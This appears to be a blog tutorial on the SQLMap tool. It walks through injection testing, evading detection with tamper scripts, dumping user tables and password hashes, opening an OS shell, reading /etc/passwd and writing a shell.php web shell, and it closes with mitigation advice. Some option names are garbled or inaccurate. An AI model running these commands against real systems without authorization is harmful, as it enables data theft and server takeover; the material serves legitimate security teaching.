---
title: "SQLMap Fundamentals - SQL Map 02"
seoTitle: "Understanding SQL Injection: SQL Map Fundamentals"
seoDescription: "Learn how to use SQLMap, an essential tool for detecting and exploiting SQL injection vulnerabilities in web applications"
datePublished: Sat Apr 27 2024 06:23:19 GMT+0000 (Coordinated Universal Time)
cuid: clvhptpc7000n0ajr1w2h1gzh
slug: sql-injection-fundamentals-sql-map-02
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1714199519602/fe530cde-6c3f-4fba-b096-5ffeb4ebf33f.png
ogImage: https://cdn.hashnode.com/res/hashnode/image/upload/v1714199532934/fe3b0e7c-4f0e-4317-81ca-34ad5d277b69.png

---

## 1\. Introduction

### 1.1 What is SQLMap?

SQLMap is an open-source penetration testing tool used to detect and exploit SQL injection vulnerabilities in web applications. It automates the process of detecting and exploiting SQL injection flaws, making it an essential tool for security professionals and penetration testers.

### 1.2 Why use SQLMap for SQL injection testing?

* Automates the detection and exploitation of SQL injection vulnerabilities
    
* Supports a wide range of databases, including MySQL, Oracle, PostgreSQL, Microsoft SQL Server, and more
    
* Provides a powerful set of features for data extraction, access control bypass, and even operating system takeover
    
* Offers flexibility and customization through numerous options and switches
    

## 2\. Setting Up SQLMap

### 2.1 Installing SQLMap

To install SQLMap, follow these steps:

1. Clone the SQLMap repository from GitHub:
    
    ```plaintext
    git clone <https://github.com/sqlmapproject/sqlmap.git>
    
    ```
    
2. Navigate to the cloned directory:
    
    ```plaintext
    cd sqlmap
    
    ```
    
3. Run SQLMap using Python:
    
    ```plaintext
    python sqlmap.py
    
    ```
    

### 2.2 Basic SQLMap Command Syntax

The basic syntax for running SQLMap is as follows:

```plaintext
sqlmap [options] -u <target-url>

```

Some common options include:

* `u`: Specify the target URL
    
* `p`: Specify the parameter(s) to test for injection
    
* `-data`: Specify the POST data to be sent
    
* `-cookie`: Specify the HTTP Cookie header value
    
* `-random-agent`: Use a random HTTP User-Agent header value
    
* `-threads`: Specify the number of concurrent threads
    
* `-dbms`: Specify the target database management system (DBMS)
    

## 3\. Running SQLMap on HTTP Requests

### 3.1 Using Copy as cURL

To use SQLMap with a cURL command:

1. Capture the HTTP request using the browser's Developer Tools
    
2. Right-click on the request and select "Copy as cURL"
    
3. Paste the cURL command into the terminal
    
4. Change `curl` to `sqlmap` in the command
    

Example:

```plaintext
sqlmap '<http://www.example.com/?id=1>' -H 'User-Agent: Mozilla/5.0'

```

### 3.2 Testing GET and POST Parameters

To test GET parameters, use the `-u` option followed by the URL with the parameter(s):

```plaintext
sqlmap -u "<http://www.example.com/page.php?id=1>"

```

To test POST parameters, use the `--data` option followed by the POST data:

```plaintext
sqlmap -u "<http://www.example.com/login.php>" --data "username=admin&password=123"

```

Use the `-p` option to specify specific parameters to test:

```plaintext
sqlmap -u "<http://www.example.com/page.php?id=1&category=2>" -p id

```

Mark the injection point with an asterisk (`*`):

```plaintext
sqlmap -u "<http://www.example.com/page.php?id=1*&category=2>"

```

### 3.3 Using Request Files

Use the `-r` option to read the HTTP request from a file:

```plaintext
sqlmap -r request.txt

```

To save a request from Burp Suite:

1. Right-click on the request and select "Copy to file"
    
2. Save the request to a file (e.g., `request.txt`)
    

### 3.4 Customizing HTTP Headers and Cookies

Use the `--cookie` option to specify cookies:

```plaintext
sqlmap -u "<http://www.example.com/>" --cookie="PHPSESSID=abc123"

```

Use the `-H` option to specify additional headers:

```plaintext
sqlmap -u "<http://www.example.com/>" -H "X-Forwarded-For: 127.0.0.1"

```

Use the `--random-agent` option to randomize the User-Agent:

```plaintext
sqlmap -u "<http://www.example.com/>" --random-agent

```

Use the `--mobile` option to simulate a mobile device:

```plaintext
sqlmap -u "<http://www.example.com/>" --mobile

```

### 3.5 Handling JSON and XML Requests

SQLMap supports JSON and XML POST data. Use the `--data` option for simple requests:

```plaintext
sqlmap -u "<http://www.example.com/api/>" --data '{"id":1}'

```

For complex JSON or XML data, use the `-r` option with a request file:

```plaintext
sqlmap -r json_request.txt

```

## 4\. Optimizing SQLMap Usage

### 4.1 Narrowing Down Injection Points

Use the `-p` option to specify specific parameters to test:

```plaintext
sqlmap -u "<http://www.example.com/page.php?id=1&category=2>" -p id

```

### 4.2 Speeding Up Scans with Threads

Use the `--threads` option to specify the number of concurrent threads:

```plaintext
sqlmap -u "<http://www.example.com/>" --threads=10

```

### 4.3 Evading Detection with Tampering

SQLMap includes several tamper scripts to modify the injection payloads and evade detection. Use the `--tamper` option to specify the tamper script(s):

```plaintext
sqlmap -u "<http://www.example.com/>" --tamper="space2comment,charencode"

```

### 4.4 Saving and Resuming Scans

Use the `--save` option to save the session to a file:

```plaintext
sqlmap -u "<http://www.example.com/>" --save=session.sqlite

```

Use the `--resume` option to resume a saved session:

```plaintext
sqlmap -u "<http://www.example.com/>" --resume=session.sqlite

```

## 5\. Database Enumeration with SQLMap

### 5.1 Listing Databases

Use the `--dbs` option to list available databases:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" --dbs

```

### 5.2 Enumerating Tables

Use the `-D` option to specify the database and the `--tables` option to list tables:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" -D testdb --tables

```

### 5.3 Dumping Table Data

Use the `-D`, `-T`, and `--dump` options to dump table data:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" -D testdb -T users --dump

```

The `--batch` and `--dump` options in SQLMap are used to automate the SQL injection process and retrieve data from the database.

1. `-batch` option:
    
    * The `-batch` option is used to run SQLMap in non-interactive mode, where it automatically selects the default options without prompting the user for input.
        
    * This option is useful when you want to automate the SQL injection process or run SQLMap in scripts or continuous integration/continuous deployment (CI/CD) pipelines.
        
    * When `-batch` is used, SQLMap will automatically choose the default values for any prompts that may appear during the SQL injection process.
        
2. `-dump` option:
    
    * The `-dump` option is used to retrieve and dump the content of the specified table(s) from the database.
        
    * It is typically used in combination with other options like `D` (database), `T` (table), and `C` (columns) to specify the target database, table(s), and columns to dump.
        
    * When `-dump` is used, SQLMap will attempt to retrieve the data from the specified table(s) and display it in the output.
        

Here's an example of using `--batch` and `--dump` together:

```plaintext
sqlmap -u "<http://www.example.com/page.php?id=1>" -p id --batch --dump -D database_name -T table_name -C column1,column2

```

In this example:

* `u` specifies the target URL.
    
* `p` specifies the vulnerable parameter.
    
* `-batch` runs SQLMap in non-interactive mode, automatically selecting the default options.
    
* `-dump` retrieves and dumps the content of the specified table(s).
    
* `D` specifies the target database name.
    
* `T` specifies the target table name.
    
* `C` specifies the columns to dump (comma-separated).
    

SQLMap will automatically perform the SQL injection attack, retrieve the specified data from the database, and display it in the output.

Note: The `--dump` option can potentially retrieve a large amount of data, depending on the size of the table(s) being dumped. Be cautious when using this option, as it may impact the performance of the target system and the network.

Remember to use SQLMap responsibly and only in legal and authorized testing scenarios.

### 5.4 Extracting Specific Columns

Use the `-C` option to specify columns to retrieve:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" -D testdb -T users -C username,password --dump

```

## 6\. Advanced SQLMap Techniques

### 6.1 Using Shells

Use the `--os-shell` option to open an interactive operating system shell:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" --os-shell

```

### 6.2 Reading/Writing Files

Use the `--file-read` option to read files from the server:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" --file-read="/etc/passwd"

```

Use the `--file-write` option to write files to the server:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

```

### 6.3 Privilege Escalation

Use the `--priv-esc` option to attempt privilege escalation:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" --priv-esc

```

### 6.4 Cracking Password Hashes

Use the `--passwords` option to crack retrieved password hashes:

```plaintext
sqlmap -u "<http://www.example.com/?id=1>" --passwords

```

# 7.Handling SQLMap Errors

When using SQLMap to test for SQL injection vulnerabilities, you may encounter various errors and issues during the setup process or while running SQLMap with HTTP requests. This guide will discuss the recommended mechanisms for identifying the cause of these errors and properly fixing them.

## 7.1. Display Errors

The first step in troubleshooting SQLMap errors is to use the `--parse-errors` option. This option instructs SQLMap to parse any DBMS errors and display them as part of the program output.

```plaintext
sqlmap -u "<http://www.example.com/vuln.php?id=1>" --parse-errors

```

Example output:

```plaintext
...SNIP...
[16:09:20] [INFO] testing if GET parameter 'id' is dynamic
[16:09:20] [INFO] GET parameter 'id' appears to be dynamic
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '))"',),)((' at line 1'"
[16:09:20] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
[16:09:20] [WARNING] parsed DBMS error message: 'SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''YzDZJELylInm' at line 1'
...SNIP...

```

By using this option, SQLMap will automatically print any DBMS errors, providing clarity on the issue and helping you properly fix it.

## 7.2. Store the Traffic

The `-t` option allows you to store the entire traffic content to an output file. This can be useful for later analysis and troubleshooting.

```plaintext
sqlmap -u "<http://www.example.com/vuln.php?id=1>" --batch -t /tmp/traffic.txt

```

Example output:

```plaintext
n-4@htb[/htb]$ cat /tmp/traffic.txt
HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (<http://sqlmap.org>)
Connection: close

HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:12:50 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: <http://www.example.com:80/?id=1>

<!DOCTYPE html>
<html lang="en">
...SNIP...

```

The `/tmp/traffic.txt` file now contains all sent and received HTTP requests, allowing you to manually investigate these requests to identify where the issue is occurring.

## 7.3. Verbose Output

The `-v` option increases the verbosity level of the console output. This can provide more detailed information about SQLMap's actions and any encountered errors.

```plaintext
sqlmap -u "<http://www.example.com/vuln.php?id=1>" -v 6 --batch

```

Example output:

```plaintext
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   <http://sqlmap.org>

[*] starting @ 16:17:40 /2020-09-24/

[16:17:40] [DEBUG] cleaning up configuration parameters
[16:17:40] [DEBUG] setting the HTTP timeout
[16:17:40] [DEBUG] setting the HTTP User-Agent header
[16:17:40] [DEBUG] creating HTTP requests opener object
[16:17:40] [DEBUG] resolving hostname 'www.example.com'
[16:17:40] [INFO] testing connection to the target URL
[16:17:40] [TRAFFIC OUT] HTTP request [#1]:
GET /?id=1 HTTP/1.1
Host: www.example.com
Cache-control: no-cache
Accept-encoding: gzip,deflate
Accept: */*
User-agent: sqlmap/1.4.9 (<http://sqlmap.org>)
Connection: close

[16:17:40] [DEBUG] declared web page charset 'utf-8'
[16:17:40] [TRAFFIC IN] HTTP response [#1] (200 OK):
Date: Thu, 24 Sep 2020 14:17:40 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Content-Encoding: gzip
Content-Length: 914
Connection: close
Content-Type: text/html; charset=UTF-8
URI: <http://www.example.com:80/?id=1>

<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="">
  <meta name="author" content="">
  <link href="vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">
  <title>SQLMap Essentials - Case1</title>
</head>

<body>
...SNIP...

```

Using the `-v 6` option, SQLMap will directly print all errors and the full HTTP requests to the terminal. This allows you to follow along with everything SQLMap is doing in real-time.

## 7.4. Using a Proxy

The `--proxy` option redirects all SQLMap traffic through a specified proxy, such as a man-in-the-middle (MiTM) proxy like Burp Suite.

```plaintext
sqlmap -u "<http://www.example.com/vuln.php?id=1>" --proxy=http://localhost:8080

```

By routing all SQLMap traffic through a proxy, you can manually investigate the requests, repeat them, and utilize all the features of the proxy tool (e.g., Burp Suite) to analyze and manipulate the requests.

### Proxy Configuration

To use a proxy with SQLMap:

1. Start your proxy tool (e.g., Burp Suite) and configure it to listen on a specific port (e.g., 8080).
    
2. Configure your web browser to use the proxy by setting the proxy host and port in the browser's network settings.
    
3. Launch SQLMap with the `-proxy` option, specifying the proxy URL (e.g., `http://localhost:8080`).
    

SQLMap will now route all its traffic through the specified proxy, allowing you to intercept, analyze, and modify the requests using the proxy tool.

### Proxy Benefits

Using a proxy with SQLMap offers several benefits:

* Inspect and modify HTTP requests and responses: You can view and modify the HTTP headers, parameters, and payloads sent by SQLMap.
    
* Repeat and replay requests: You can resend specific requests to the target application for further testing and analysis.
    
* Bypass client-side controls: Proxies can help bypass client-side controls, such as anti-CSRF tokens or client-side validation.
    
* Troubleshoot and debug: Proxies provide a detailed view of the traffic, making it easier to identify and fix issues.
    

Handling errors and troubleshooting issues in SQLMap is an essential skill for effective SQL injection testing. By using options like `--parse-errors`, `-t`, `-v`, and `--proxy`, you can gain valuable insights into the behavior of SQLMap and the target application.

Remember to carefully analyze the error messages, stored traffic, verbose output, and proxy logs to identify the root cause of the issues and determine the appropriate fixes.

With practice and experience, you'll become proficient in handling SQLMap errors and optimizing your SQL injection testing process.

## 8\. Mitigating SQL Injection Vulnerabilities

### 8.1 Input Validation

* Validate and sanitize user inputs
    
* Use prepared statements and parameterized queries
    
* Whitelist allowed characters and patterns
    

### 8.2 Parameterized Queries

* Use prepared statements with parameterized queries
    
* Separate the SQL query structure from the data
    

### 8.3 Least Privilege Database Accounts

* Use least privileged database accounts
    
* Restrict permissions based on the application's needs
    

### 8.4 Web Application Firewalls

* Implement a web application firewall (WAF)
    
* Configure the WAF to detect and block SQL injection attempts
    

## 9\. Conclusion

### 9.1 Recap of Key SQLMap Concepts

SQLMap is a powerful tool for detecting and exploiting SQL injection vulnerabilities. It offers a wide range of features and options to automate the testing process and perform advanced attacks.

### 9.2 Importance of Secure Coding Practices

To prevent SQL injection vulnerabilities, it is crucial to follow secure coding practices, such as input validation, parameterized queries, and least privilege database accounts.

### 9.3 Additional Resources for Learning

For more information on SQLMap and SQL injection, refer to the following resources:

* [SQLMap User's Manual](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
    
* [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
    
* [PortSwigger SQL Injection Cheat Sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    

This comprehensive technical learning guide covers the essential concepts and techniques for using SQLMap effectively in SQL injection testing. By following the step-by-step instructions and examples, readers can gain a deep understanding of SQLMap's capabilities and learn how to apply them in real-world scenarios.